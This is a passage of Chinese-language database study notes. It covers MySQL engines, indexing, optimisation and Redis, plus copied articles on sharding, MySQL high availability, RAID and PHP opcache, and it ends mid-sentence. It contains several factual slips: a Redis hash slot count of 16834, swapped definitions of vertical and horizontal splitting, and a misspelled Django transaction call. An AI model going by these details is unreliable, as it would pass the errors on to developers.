            select * from depart inner join userinfo on userinfo.did = depart.id   5
复制代码
MySQL数据库引擎以及区别？
复制代码
a. 常见innodb、mysiam
b. 区别：
            - innodb：
                - 支持事务（特性：原子性、一致性、隔离性、持久性）
                  事务就是（要完成都完成，要不完成就回滚）
                - 表锁
                - 行锁
            - mysiam
                - 不支持事务
                - 表锁
                - 全文索引
                - 速度快                
复制代码
复制代码
补充：
            原生SQL
                begin;
                
                select * from xxx  for update;
                
                update ...
                
                commit;
            
            django:
                    
                with trancation.automic:
                    User.objects.filter().select_for_update()
复制代码
应用场景：商品数据计数。
索引
复制代码
作用：
        - 加速查找
        - 约束
    种类：
        - 索引：随便写
        - 唯一索引：允许Null + 不重复
        - 主键索引：不允许Null + 不重复
        
        - 联合索引：多列组成一个索引
        - 联合唯一索引：多列组成一个索引 + 唯一
            例如：
                name  email  pwd 
                
         命中索引遵循最左前缀的原则： name、name  email、name pwd、name  email  pw
复制代码
复制代码
补充：
        - 覆盖索引，当查找数据时候在索引表中就可以获取数据，无需去数据表中查找。
                    select name from user where name='xxx'
        - 索引合并, 使用多个单列索引进行查找。
                    select * from user where name='xx' email='xx'
                    
    
    为什么索引快？
        因为在索引结构中讲述按照B+来进行存放的数据。
复制代码
优化数据库方案
复制代码
    a. 索引。
    b. 固定长度的字段写在前面。
            id  name  age < id  age name
    c. 对于固定选择的内容：性别，可以将其对应关系保存在内存中。
    d. 分表
            - 垂直分分，将数据分割到N张表。
            - 水平分分，将列分到到N种表。
    e. 分库 
    f. 读写分离（主从复制）
        主：读写
        从：读        
            
        
        在django中的应用：
            models.Users.objects.filter(id=2).using('default')
            models.Users.objects.filter(id=2).using('db1')
    g. limit 
        select * from tb where name='alex' limit 1;
        
    h. 缓存
        将常用数据读取到redis中（缓存），读取速度快。
        
复制代码
char和varchar的区别。
char是定长，不变的。
varchar是变长，可变的。
char 速度快，但是占空间。
varchar速度慢，但是省内存
视图、触发器、存储过程、函数
视图：视图是一个虚拟表（非真实存在），其本质是【根据SQL语句获取动态的数据集，并为其命名】，用户使用时只需使用【名称】即可获取结果集，并可以将其当作表来使用。
存储过程是一个SQL语句集合，当主动去调用存储过程时，其中内部的SQL语句会按照逻辑执行。
mysql自定义函数就是实现程序员需要sql逻辑处理，参数是IN参数,含有RETURNS字句用来指定函数的返回类型，而且函数体必须包含一个RETURN value语句。
触发器：对某个表进行【增/删/改】操作的前后如果希望触发某个特定的行为时，可以使用触发器，触发器用于定制用户对表的行进行【增/删/改】前后的行为。
事务用于将某些操作的多个SQL作为原子性操作，一旦有某一个出现错误，即可回滚到原来的状态，从而保证数据库数据完整性。
创建了引之后一定要命中索引
复制代码
    - like '%xx'
        select * from tb1 where name like '%cn';
    - 使用函数
        select * from tb1 where reverse(name) = 'wupeiqi';
    - or
        select * from tb1 where nid = 1 or email = 'seven@live.com';
        特别的：当or条件中有未建立索引的列才失效，以下会走索引
                select * from tb1 where nid = 1 or name = 'seven';
                select * from tb1 where nid = 1 or email = 'seven@live.com' and name = 'alex'
    - 类型不一致
        如果列是字符串类型，传入条件是必须用引号引起来，不然...
        select * from tb1 where name = 999;
    - !=
        select * from tb1 where name != 'alex'
        特别的：如果是主键，则还是会走索引
            select * from tb1 where nid != 123
    - >
        select * from tb1 where name > 'alex'
        特别的：如果是主键或索引是整数类型，则还是会走索引
            select * from tb1 where nid > 123
            select * from tb1 where num > 123
    - order by
        select email from tb1 order by name desc;
        当根据索引排序时候，选择的映射如果不是索引，则不走索引
        特别的：如果对主键排序，则还是走索引：
            select * from tb1 order by nid desc;
     
    - 组合索引最左前缀
        如果组合索引为：(name,email)
        name and email       -- 使用索引
        name                 -- 使用索引
        email                -- 不使用索引
复制代码
数据库对比
关系型数据库和非关系型数据库：
关系型数据库：MySQL、SQLite、SQLServer、access、oracle、db2 
非关系型数据库：redis、memcached、mongodb
持久化存到文件中：
MySQL、SQLite、mongodb、SQLServer、access、oracle、db2 
持久化存到内存中的是：
redis、memcached
redis和memcached的区别？
相同点：都是将数据保存到内存，存取速度都比较快。 自己想：在内存中存在一个大字典，你对字典进行操作。
复制代码
不同点：
    - 数据类型：
                - redis，5大数据类型
                    {
                        k1:v1,
                        k2:[11,22],
                        k3:{
                            kk1:vv1,
                            kk2:vv2,
                        },
                        k4: {1,2,3},
                        k5: {('alex',8),('oldboy',5)}
                        
                    }
                - memcached，1中类型：字符串
                    {
                        k1:v1,
                    }
    - 持久化
                - redis，支持持久化
                - memcached，不支持。
     - 集群架构
                - redis，支持
                - memcached，不支持。
     - 自动过期策略
                - redis，支持
                    voltile-lru：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰

                    volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰
                    
                    volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰
                    
                    allkeys-lru：从数据集（server.db[i].dict）中挑选最近最少使用的数据淘汰
                    
                    allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰
                    
                    no-enviction（驱逐）：禁止驱逐数据
                - memcached，不支持。
复制代码
redis持久化的两种方式
- AOF,记录下用户所有执行的命令。然后如果宕机了，或者出故障了，直接按照记录下的用户的命令就可以保持数据完整了。（恢复时间慢，但是数据能够保持完整）
- RDB,定时持久化。就是过一段时间保存一次（恢复时间快，但是数据不一定完整）
redis默认支持主从复制
主ip只用在配置文件中写上slaveof就行
redis的高可用（sentinel）哨兵
自动检测主服务器是否正常
哨兵的作用简单来说就是（主redis和复redis，主redis挂掉之后，哨兵会自动检测到，然后都连上哨兵，哨兵会自动检测谁死谁活，这就是哨兵的作用，另外哨兵尽量设置三个，如果因为网络原因或者遇到特殊情况的话，三个哨兵会以半数以上的方式决定这个redis是否宕机）
redis分布式（cluster）
 - redis cluster
 - codis 
 - Twemproxy
redis中默认有16834个哈希槽
redis分布式锁
连接所有的redis服务器，在服务器上设置 k1 = 随机字符串； 成功一半以上，表示获得锁。
其他人来，也会设置，但是设置时会成功 < 一半； 表示未获取锁，等待。
超时，锁自动释放。
释放锁；连接所有服务器删除 k1=原来设置的随机字符串 ；而且删除的时候不是执行命令，而是删除的是lua脚本，（因为脚本效率高）

```

### 分片
```
https://www.cnblogs.com/qcloud1001/p/10405281.html
Introduction 导言
任何看到显著增长的应用程序或网站，最终都需要进行扩展，以适应流量的增加。以确保数据安全性和完整性的方式进行扩展，对于数据驱动的应用程序和网站来说十分重要。人们可能很难预测某个网站或应用程序的流行程度，也很难预测这种流行程度会持续多久，这就是为什么有些机构选择“可动态扩展的”数据库架构的原因。

在这篇概念性文章中，我们将讨论一种“可动态扩展的”数据库架构：分片数据库。近年来，分片（Sharding）一直受到很多关注，但许多人并没有清楚地了解它是什么，或者对数据库进行分片可能有意义的场景。我们将讨论分片是什么，它的一些主要优点和缺点，以及一些常见的分片方法。

下方是本文目录，帮助您接下来的阅读

img

What is Sharding? 什么是分片？
分片（Sharding）是一种与水平切分（horizontal partitioning）相关的数据库架构模式——将一个表里面的行，分成多个不同的表的做法（称为分区）。每个区都具有相同的模式和列，但每个表有完全不同的行。同样，每个分区中保存的数据都是唯一的，并且与其他分区中保存的数据无关。

从水平切分（horizontal partitioning）与垂直切分（vertical partitioning）的关系，可能会有所帮助。在垂直切分表中，所有的列被分离出来，并放入新的不同的表中。每个垂直切分内的数据，独立于所有其他分区中的数据，并且每个分区都包含不同的行和列。下图说明了如何在水平和垂直方向上对表进行分区：

img

添加描述

分片（Sharding）将一个数据分成两个或多个较小的块，称为逻辑分片（logical shards）。然后，逻辑分片（logical shards）分布在单独的数据库节点上，称为物理分片（physical shards）。物理分片（physical shards）可以容纳多个逻辑分片（logical shards）。尽管如此，所有分片中保存的数据，共同代表整个逻辑数据集。

数据库分片（Database shards）是无共享架构的一个例子。这意味着分片是自治的：分片间不共享任何相同的数据或服务器资源。但是在某些情况下，将某些表复制到每个分片中作为参考表是有意义的。例如，假设某个应用程序的数据库依赖于重量测量的固定转换率。通过将包含必要转换率数据的表复制到每个分片中，有助于确保查询所需的所有数据都保存在每个分片中。

通常，分片（Sharding）在应用程序级别进行实现。这意味着应用程序包含“要向哪个分片发送读和写”的代码。但是，某些数据库管理系统内置了分片功能，允许您直接在数据库级别实现分片。

以上是分片（Sharding）的概述，接下来让我们来看一下，这种数据库架构的优点和缺点。

Benefits of Sharding 分片的好处
数据库分片的主要吸引力在于，它可以帮助促进水平扩展（horizontal scaling），也称为向外扩展（scaling out）。水平扩展是将更多的机器添加到现有堆栈中，以分散负载，允许更多的流量和更快的处理。这通常与垂直扩展（vertical scaling）形成对比，垂直扩展也称为向上扩展（scaling up），是指升级现有服务器的硬件，通常是添加更多内存或CPU。

让一个关系数据库在单个机器上运行，并按需升级其服务器资源进行向上扩展是相对简单的。但最终，任何非分布式数据库在存储和计算能力方面都会受到限制，因此可以自由地水平扩展数据库，会使您的架构更加灵活且适应性强。

选择分片数据库架构的另一个原因，是为了加速查询响应的时间。当您对尚未分片的数据库提交查询时，必须先搜索您查询的表中的每一行，然后才能找到您要查找的结果集。对于具有大型单片数据库的应用程序，查询可能变得极其缓慢。但是，通过将一个表分成多个，查询过程会遍历更少的行，并且返回结果集的速度要快得多。

分片还可以通过减少宕机（outage）的影响，使应用程序更稳定可靠。如果您的应用程序或网站依赖于未分片的数据库，则宕机可能会导致整个应用程序不可用。但是，对于分片数据库，宕机可能只会影响单个分片。即使这可能使某些用户无法使用应用程序或网站部分功能，但仍会低于整个数据库崩溃带来的影响。

Drawbacks of Sharding 分片的缺点
虽然对数据库进行分片可以使扩展更容易并提高性能，但它也可能会带来某些限制。在这里，我们将讨论其中的一些限制，以及为什么这些限制会让我们避免对数据库全部分片。

正确实现分片数据库架构，是十分复杂的，所以这是分片遇到的第一个困难。如果操作不正确，则分片过程可能会导致数据丢失或表损坏，这是一个很大的风险。但是，即使正确地进行了分片，也可能对团队的工作流程产生重大影响。与从单个入口点访问和管理数据不同，用户必须跨多个分片位置管理数据，这可能会让某些团队存在工作混乱。

在对数据库进行分片后，用户有时会遇到的一个问题是分片最终会变得不平衡。举例来说，假设您有一个数据库，其中有两个单独的分片，一个用于姓氏以字母A到M开头的客户，另一个用于名字以字母N到Z开头的客户。但是，您的应用程序为姓氏以字母G开头的人提供了过多的服务。因此，A-M分片逐渐累积的数据比N-Z分片要多，这会导致应用程序速度变慢，并对很大一部分用户造成影响。A-M分片已成为所谓的数据热点。在这种情况下，数据库分片的任何好处都被慢速和崩溃抵消了。数据库可能需要修复和重新分片，才能实现更均匀的数据分布。

另一个主要缺点是，一旦对数据库进行了分片，就很难将其恢复到未分片的架构。分片前数据库的备份数据，都无法与分片后写入的数据合并。因此，重建原始的非分片架构，需要将新的分区数据与旧备份合并，或者将分区的数据库转换回单个数据库，这两种方法都是昂贵且耗时的。

要考虑的最后一个缺点是，并不是每个数据库引擎本身都支持分片。例如，尽管可以手动分片PostgreSQL数据库，但PostgreSQL本身并不包括自动分片功能。有许多Postgres分支包括自动分片功能，但这些分支通常落后于最新的PostgreSQL版本，并且缺乏某些其他的功能特性。一些专业的数据库技术——如MySQL Cluster或某些数据库即服务产品（如MongoDB Atlas）确实包含自动分片功能，但这些数据库管理系统的普通版本却并不包含。因此，分片通常需要“自己动手”的方法。这意味着通常很难找到有关分片或故障排除技巧的文档。

现在我们已经介绍了一些分片的缺点和好处，我们将讨论一些分片数据库的不同架构。

一旦你决定对数据库进行分片，接下来你需要弄清楚的是如何进行分片。在运行查询或将传入的数据分发到分片表或数据库时，关键是要将其分配到正确的分片。否则，它可能导致数据丢失或查询速度缓慢。在本节中，我们将介绍一些常见的分片架构，每个架构使用稍微不同的流程来跨分片分发数据。

Key Based Sharding 基于键的分片
img

添加描述

为了确保数据记录以正确的方式被放置在正确的分片中，哈希函数中输入的值都应该来自同一列。此列称为分片键。简单来说，分片键与主键类似，因为它们都是列，用于为各个行建立唯一标识符。一般来说，分片键应该是静态的，这意味着它不应包含可能随时间变化的值。否则，它会增加更新操作的工作量，并可能降低性能。

虽然基于键的分片是一种相当常见的分片架构，但在尝试动态添加或删除数据库中的其他服务器时，它会使事情变得棘手。在添加服务器时，每个服务器都需要一个相应的哈希值，并且许多现有条目（如果不是全部）都需要重新映射到新的正确哈希值，然后迁移到相应的服务器。当您开始重新平衡数据时，新旧哈希函数都不会有效。因此，在迁移期间，您的服务器将无法编写任何新数据，您的应用程序可能会停机。

这种策略的主要吸引力在于，它可以用于均匀分布数据，从而防止热点。此外，由于它以算法方式分配数据，因此无需维护所有数据所在位置的映射，而其他策略（如范围或基于目录的分片）必须维护数据位置的映射。

Range Based Sharding 基于范围的分片
基于范围的分片（Range based sharding），基于给定值的范围进行数据分片。为了说明，假设您有一个数据库，用于存储零售商目录中所有产品的信息。您可以创建一些不同的分片，并根据每个产品的价格范围分配每个产品的信息，如下所示：

img

添加描述

基于范围的分片的主要好处是，它实现起来相对简单。每个分片都包含一组不同的数据，但它们都具有相同的模式，以及原始数据库。应用程序代码只读取数据所属的范围，并将其写入相应的分片。

另一方面，基于范围的分片并不能预防数据不均匀分布的现象，而有可能会出现前面提到的数据热点现象。查看示例图，即使每个分片拥有相同数量的数据，特定产品比其他产品获得更多关注的可能性也会很大。相应的，各个的分片将接收不成比例的读取操作。

Directory Based Sharding 基于目录的分片
要实现基于目录的分片，必须创建并维护一个查找表，该查找表使用分片键来跟踪哪个分片包含哪些数据。简而言之，查找表是一个表，其中包含有关可以找到特定数据的静态信息集。下图显示了基于目录的分片的简单示例：

img

添加描述

此处，Delivery Zone列被定义为分片键。将来自分片键的数据，连同每一行应该写入的分片写入查找表。这与基于范围的分片类似，但不是确定分片键的数据落入哪个范围，而是将每个键绑定到其自己的特定分片。如果分片键的基数很低，并且分片键存储键的范围没有意义，那么基于目录的分片比基于范围的分片要更好。请注意，它也不同于基于密钥的分片，因为它不通过散列函数处理分片键; 它只是根据查找表检查键值，以查看数据需要写入的位置。

基于目录的分片的主要吸引力在于其灵活性。基于范围的分片架构只能指定键值范围，而基于键的分片架构只能使用固定的哈希函数，如前所述，在以后更改该函数非常困难。另一方面，基于目录的分片允许您使用任何系统或算法将数据项分配给分片，使用这种方法动态添加分片也相对容易。

虽然基于目录的分片是这里讨论的最灵活的分片方法，但是在每次查询或写入之前连接到查找表，可能会对应用程序的性能产生不利影响。此外，查找表可能出现单点故障：如果查询表损坏或出现其他故障，它可能会影响数据库写入新数据或访问现有数据的能力。

Should I Shard? 我应该分片吗？
是否应该实现分片数据库架构，几乎总是一个争论的问题。有些人认为分片对于达到一定规模的数据库来说，是不可避免的结果。而另一些人则认为这是一个令人头疼的问题，除非绝对必要，否则应该避免，因为分片增加了操作的复杂性。

由于这种增加的复杂性，通常仅在处理非常大量的数据时才执行分片。以下是一些常见方案，可能对数据库分片的操作有所帮助：

· 应用程序数据量增长到超过单个数据库节点的存储容量。

· 对数据库的读写量，超过单个节点或其只读副本可以处理的量，从而导致响应时间增加或超时。

· 应用程序所需的网络带宽，超过单个数据库节点和任何只读副本可用的带宽，从而导致响应时间增加或超时。

在分片之前，您应该用尽所有其他选项来优化数据库。您可能需要考虑的一些优化包括：

设置远程数据库。如果您使用的是一个整体应用程序，其中所有组件都位于同一个服务器上，那么可以通过将数据库移到它自己的机器上来提高数据库的性能。由于数据库的表保持不变，因此这不会增加分片的复杂性。但是，它仍然允许您垂直伸缩数据库，使其与基础结构的其他部分分离。

实现缓存。如果您的应用程序的读取性能导致您遇到麻烦，那么缓存是一种可以帮助改进它的策略。缓存涉及临时存储已在内存中请求的数据，以便您以后更快地访问它。

创建一个或多个只读副本。另一种有助于提高读取性能的策略，包括将数据从一个数据库服务器（主服务器）复制到一个或多个从服务器。在此之后，每次新的写操作在复制到从服务器之前都要先到主服务器，而读操作只对从服务器进行。像这样分发读写可以防止任何一台机器承担过多的负载，从而有助于防止速度下降和崩溃。请注意，创建读副本需要更多的服务器资源，因此花费更多的钱，这对一些人来说可能是一个很大的限制。

升级到更大的服务器。在大多数情况下，将一个数据库服务器扩展到具有更多资源的计算机比分片需要更少的工作量。与创建只读副本一样，具有更多资源的服务器升级可能会花费更多的钱。因此，只有当它确实是您的最佳选择时，您才应该进行服务器扩容。

请记住，如果您的应用程序或网站增长超过某个点，这些策略本身都不足以提高性能。在这种情况下，分片可能确实是您的最佳选择。

Conclusion 结语
对于那些希望横向扩展数据库的人来说，分片是一个很好的解决方案。但是，它还会增加很多复杂性，并为您的应用程序创建更多潜在的故障点。分片对于某些人来说可能是必要的，但是创建和维护分片架构所需的时间和资源可能会超过对其他人的好处。

通过阅读这篇概念性文章，您应该更清楚地了解分片的优缺点。接下来，您可以使用这些见解来对分片数据库架构是否适合您，做出更明智的决定。
```

### 高可用集群
```
https://www.cnblogs.com/rouqinglangzi/p/10921982.html
一、Mysql高可用解决方案
方案一：共享存储
一般共享存储采用比较多的是 SAN/NAS 方案。

方案二：操作系统实时数据块复制
这个方案的典型场景是 DRBD，DRBD架构(MySQL+DRBD+Heartbeat)

方案三：主从复制架构
主从复制(一主多从)

MMM架构(双主多从)

MHA架构(多主多从)

方案四：数据库高可用架构
这种方式比较经典的案例包括 MGR(MySQL Group Replication)和 Galera 等，最近业内也有一些类似的尝试，如使用一致性协议算法，自研高可用数据库的架构等。

1.MGR(MySQL Group Replication，MySQL官方开发的一个实现MySQL高可用集群的一个工具。第一个GA版本正式发布于MySQL5.7.17中)

2.Galera

其它方案：MySQL Cluster和PXC
MySQL Cluster(ndb存储引擎，比较复杂，业界并没有大规模使用)

PXC(Percona XtraDB Cluster)

如何选择合适的Mysql集群架构？
MHA看业务规模和需求选择

mysql官方的Mysql Cluster。比较复杂，团队有人、资源充足，可以考虑尝试，貌似用的人不多。

小团队或资源不足或小项目直接建议阿里云、腾讯云

 

回到顶部
二、部分常见方案的简介
1.Mysql主从架构


2.MHA 架构(Master High Availability Manager and Toolsfor MySQL)
参考：生产环境MySQL数据库集群MHA上线实施方案

MHA(Master High Availability Manager and Toolsfor MySQL)目前在Mysql高可用方面是一个相对成熟的解决方案。它是日本的一位MySQL专家采用Perl语言编写的一个脚本管理工具，该工具仅适用于MySQLReplication 环境，目的在于维持Master主库的高可用性。

MHA是基于标准的MySQL复制(异步/半同步)。

MHA是由管理节点(MHA Manager)和数据节点(MHA Node)两部分组成。

MHA Manager可以单独部署在一台独立机器,也可以部署在一台slave上。



3.MMM 架构(Master-Master replication manager for Mysql)
可参考：MySQL-MMM实现MySQL高可用

MMM，全称为Master-Master replication manager for Mysql，是一套支持双主故障切换和双主日常管理的脚本程序，MMM使用Perl语言开发。主要用来监控和管理MySQL Master-Master(双)复制。特别适合DBA做维护等需要主从复制的场景，通过双主架构避免了重复搭建从库的麻烦。虽然叫做双主复制，但是业务上同一时刻只允许对一个主进行写入，另一台备选主上提供部分读服务，以加速在主主切换时备选主的预热。

(MMM好像不靠谱，据说不稳定，但还是有人在用)



MMM优缺点
　　优点：高可用性，扩展性好，出现故障自动切换，对于主主同步，在同一时间只提供一台数据库写操作，保证的数据的一致性。
　　缺点：Monitor节点是单点，可以结合Keepalived实现高可用。

4.DRBD 架构(MySQL+DRBD+Heartbeat)
 官网：https://www.linbit.com/en/drbd-community/drbd-download/

 

回到顶部
三、读写分离解决方案
客户端解决方案（应用层）：TDDL、 Sharding-Jdbc (常用shardding-jdbc)
中间件解决方案（代理层）：mysql proxy、mycat、altas  (常用mycat)
           

 

客户端解决方案的特点：

优点：

　　1、程序自动完成，数据源方便管理

　　2、不需要维护，因为没用中间件

　　3、理论支持任何数据库 （sql标准）

缺点：

　　1、增加了开发成本、代码有入侵

　　2、不能做到动态增加数据源

　　3、程序员开发完成，运维参与不了。

 

中间件解决方案的特点：

优点：

　　1、数据增加了都程序没用任何影响

　　2、应用层（程序）不需要管数据库方面的事情

　　3、增加数据源不需要重启程序

缺点：

　　1、程序依赖中间件，导致切换数据库变的困难

　　2、增加了proxy 性能下降

　　3、增加了维护工作、高可用问题。

```

### RAID
```
https://www.cnblogs.com/mysql-dba/p/7120601.html
作为一名DBA，选择自己的数据存储在什么上面，应该是最基本的事情了。但是很多DBA却容易忽略了这一点，我就是其中一个。之前对raid了解的并不多，本文就记录下学习的raid相关知识。

一、RAID的基础知识

【定义】RAID(Redundant Array of Independent Disk)是一种独立冗余磁盘阵列。

1、为什么要使用RAID?

我们知道，单块磁盘无论是从性能上、容量上、还是安全上都存在单点问题，如果把多块硬盘组成一个group，当成一个逻辑驱动器，从而实现同时从多块硬盘存取数据，那样可以提高了存储的吞吐量，同时也提高了存取速度和扩大存储容量。

RAID(Redundant Array of Independent Disk 独立冗余磁盘阵列)技术就是专门干这事的。RAID就是一种由多块廉价磁盘构成的冗余阵列，在操作系统下是作为一个独立的大型存储设备出现。RAID可以充分发挥出多块硬盘的优势，可以提升硬盘速度，增大容量,提供容错功能够确保数据安全性，易于管理的优点，在任何一块硬盘出现问题的情况下都可以继续工作，不会受到损坏硬盘的影响，这对于数据库存储领域是非常必要的。

2、RAID的几种工作级别

我们比较常用的RAID级别有RAID-0、RAID-1、RAID-10/RAID-01、RAID-5，其他的如RAID-3、RAID-4、RAID-6就不在此介绍了。

RAID-0
         RAID-0采用数据分条技术（Striped）把多块磁盘串联成一个更为庞大的磁盘组，可以提高磁盘的性能和吞吐量。它读写数据的速度是最快的，要求比较低，要求两个磁盘即可做RAID-0，相对成本是最低的，但是RAID-0不提供冗余或奇偶校验数据的功能，如果驱动器出现故障，数据将无法恢复，安全性最弱。一般只是在那些对性能要求高、数据安全性要求不高的情况下才被使用，不适合数据库的存储。



RAID-1
        RAID-1采用镜像（Mirroring）的方式冗余数据。RAID-1要求至少两个或2xN个磁盘，每次写数据时会同时写入镜像盘。这种阵列可靠性很高，但其有效容量减小到总容量的一半，同时这些磁盘的大小应该相等，否则总容量只具有最小磁盘的大小。RAID-1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID级别中最低的。



RAID-10
        由于RAID-0和RAID-1都存在明显的优点和缺点，为了结合两者的优点、避免两者的缺点，从而产生了RAID-10，RAID-10适合用在速度需求高，又要完全容错，当然成本也很多的应用。不过在做RAID-10时需要注意的是先做RAID-1，再做RAID-0还是先做RAID-0，再做RAID-1，二者还是有区别的。举个栗子，假如现在有四块磁盘：

        先做RAID-0，再做RAID-1：每两块磁盘先做RAID-0，在此基础上，再把两个RAID-0做成RAID-1。这时如果A类或者B类磁盘同时有一个故障，整个RAID将不可用。

(RAID 0) A = (Drive A1 + Drive A2) (Striped)
(RAID 0) B = (Drive B1 + Drive B2) (Striped)
(RAID-1)AB = (A +  B) (Mirrored)
       先做RAID-1，再做RAID-0：每两块磁盘先做RAID-1，在此基础上，再把两个RAID-1做成RAID-0。这时只有A类或者B类磁盘两个都故障时，整个RAID才不可用。

(RAID-1) A = (Drive A1 + Drive A2) (Mirrored)
(RAID-1) B = (Drive B1 + Drive B2) (Mirrored)
(RAID-0)AB = (A +  B) (Striped)
综合上面来看，先做RAID-1，再做RAID-0相对更安全，建议这种方式，所以我们平时说的RAID-10就是先做RAID-1，再做RAID-0。

RAID-5
        RAID-5应该处于RAID-0和RAID-1之间的一种工作模式，它尽量平衡RAID-0和RAID-1的优点和缺点，是我们平时使用比较多的一种模式。做RAID-5至少需要三块磁盘，它采用校验码冗余数据，校验信息分布在多个磁盘上，当数据每次写入到磁盘上，同时还需要写入校验信息，因此写入性能相对不如RAID-0。当某个磁盘出现故障，可以使用其他磁盘上校验信息来恢复数据。相对RAID-1，它磁盘空间利用率为(N-1)/N



3、RAID的几种工作级别优缺点

 

【注】以上的高、中、低只是相对于RAID-0、RAID-1、RAID-10、RAID-5而言。

 

二、如何判断RAID级别、写入策略、电池状况

 1、判断RAID级别：MegaCli64工具输入磁盘信息如下：

复制代码
[root()@xxxx ~]# MegaCli64 -LdInfo -lAll -aALL
                                     
Adapter 0 -- Virtual Drive Information:
Virtual Drive: 0 (Target Id: 0)
Name                :
RAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0
Size                : 278.875 GB
Is VD emulated      : No
Mirror Data         : 278.875 GB
State               : Optimal
Strip Size          : 64 KB
Number Of Drives    : 2
Span Depth          : 1
Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Current Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Default Access Policy: Read/Write
Current Access Policy: Read/Write
Disk Cache Policy   : Disabled
Encryption Type     : None
Default Power Savings Policy: Controller Defined
Current Power Savings Policy: None
Can spin up in 1 minute: Yes
LD has drives that support T10 power conditions: Yes
LD's IO profile supports MAX power savings with cached writes: No
Bad Blocks Exist: No
PI type: No PI

Is VD Cached: No


Virtual Drive: 1 (Target Id: 1)
Name                :
RAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0
Size                : 2.180 TB
Is VD emulated      : Yes
Mirror Data         : 2.180 TB
State               : Optimal
Strip Size          : 64 KB
Number Of Drives per span   : 2
Span Depth          : 3
Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Current Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Default Access Policy: Read/Write
Current Access Policy: Read/Write
Disk Cache Policy   : Disabled
Encryption Type     : None
Default Power Savings Policy: Controller Defined
Current Power Savings Policy: None
Can spin up in 1 minute: No
LD has drives that support T10 power conditions: No
LD's IO profile supports MAX power savings with cached writes: No
Bad Blocks Exist: No
PI type: No PI

Is VD Cached: No
复制代码
网上有人仅仅通过RAID Level列中的Primary-1, Secondary-0, RAID Level Qualifier-0来判断，我认为不是很准确。先来了解下Primary、Secondary、RAID Level Qualifier啥意思？

Primary字段：基本上可以确定RAID的级别，但是无法区分是RAID-1和RAID-10，因为有情况下他们的Primary值都是Primary-1, Secondary-0, RAID Level Qualifier-0

在这种情况下如何区分RAID-1和RAID-10？我认为还得结合另外两列进行判断：

Number Of Drives per span   : 2    #每个区段有2块磁盘
Span Depth                  : 3    #一共三个区段
结合primary-1，该RAID表示一共六块磁盘，每两个做RAID-1，最后将三个RAID-1做RAID-0
【总结：如何判断RAID级别】：

1)  除了RAID-1和RAID-10，其他级别通过Primary字段值就可以判断；

2) 至于RAID-1和RAID-10，还需要结合Number Of Drives （per span）、Span Depth两列的值，如果Span Depth值为1表示为RAID-1，不为1表示RAID-10;还有一种情况：Primary-1, Secondary-3, RAID Level Qualifier-0也是表示RAID-10;

 

 

2、判断RAID写入策略和电池状态

 

RAID的写入策略对IO性能有很大影响，有两种写入策略：

WriteBack：表示写入到磁盘缓存上，写入性能好，如果采用此策略，RAID必须支持电池可用，否则一旦断点，数据将丢失。
WriteThrough：表示直接写入到硬盘上，写入性能没有WriteBack好，一般没有电池时采用此策略
2.1）查看RAID的写入策略

复制代码
[root()@xxxx ~]# MegaCli64 -LDInfo -Lall -aALL|grep 'Cache Policy'
**********************************************************************************
Default Cache Policy: WriteBack, ReadAdaptive, Direct, Write Cache OK if Bad BBU
Current Cache Policy: WriteBack, ReadAdaptive, Direct, Write Cache OK if Bad BBU 
以上表示采用WriteBack（回写）策略，如果电池坏了也强制写入cache
  Default Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU
  Current Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU

  如果是这个，表示采用WriteThrough策略

**********************************************************************************
Disk Cache Policy   : Disabled     #表示硬盘的cache，一般这里禁用，防止丢失数据
复制代码
2.2）查看电池状态

[root()@xxxx ~]# MegaCli64 -adpbbucmd -aall |grep -E  'Battery State|Charger Status|isSOHGood|Relative State of Charge'                        
Battery State     : Operational  #电池状态，operational表示正在运行
Relative State of Charge: 98 %   #电池电量，如果低于15%，那么写入策略会由WB转变为WC,IO性能下降，需要关注
Charger Status: Complete         #充电情况，表示已完成
isSOHGood: Yes                   #不是Yes需要关注
 

三、MySQL适合的RAID存储方案

 通过上面对RAID的了解，我们已经知道各级别RAID的优缺点，对于MySQL数据库的存储，如何选择RAID级别呢？

 我们可以根据MySQL各种文件类型分别选择，MySQL数据库重要的文件类型有：

1、数据文件(frm,ibd)：存储核心的数据，非常重要，安全性要求高，同时需要频繁的写入、更新数据，磁盘性能要求也比较高，首先建议物理磁盘是SSD，对于RAID的选择，如果预算足够，建议RAID-10，其次是RAID-5

2、二进制日志文件：写入非常频繁，写性能要求高，由于从库依赖该文件，安全性也很重要，综合成本考虑，可以用两块SATA硬盘，做成RAID-1即可。

3、redo文件，共享表空间文件：安全性要求高，如果预算足够，RAID-10，通常RAID-1也是可以的，一般而言，redo文件和共享表空间和数据文件存储在一起即可。
```

### 源代码编译、内存调优
```
https://www.cnblogs.com/lin3615/p/5638219.html
最近安装了 php5.6，发现有了 opcache.so扩展文件，于是，搜索了一下，
发现 zend opcache已经融入到 ph5.5以上的版本了,即兴奋，不用再去找
xcache,apc,eAccelerator 这些缓存了
PHP手册上面也说了好详细的配置文件说明，这里不再详情说明,
最好是把编译生成的 opcache.so和别的扩展放一起
基本的配置可以这样配置即可(php.ini文件)
zend_extension=opcache.so
opcache.enable=1
opcache.enable_cli=1
opcache.memory_consumption=128
opcache.interned_strings_buffer=8
opcache.max_accelerated_files=100000
opcache.validate_timestamps=1
opcache.revalidate_freq=7200
以上的是基本配置，就可以使用了，具体更高级，根据实际情况，
可以修改相关参数设置，手册上面已经说得好清楚了
几乎什么事情，用得好就是如虎添冀，用不好，就是一个大坑。
所以，如果启用了，文件修改了，时间不到，还没有生效,
所以，为了立即生效，可以重新web服务，但一般这些不可取，会造成中断
opache提供了 opcache_invalidate(文件名,true),此时则立即重新编译,
opcache_reset()这个是在生成此文件前生效，如果一旦生成了，还没有
过期的，则不会生效.所以，要做到让变更的文件立即生效，可以生成一个文件，
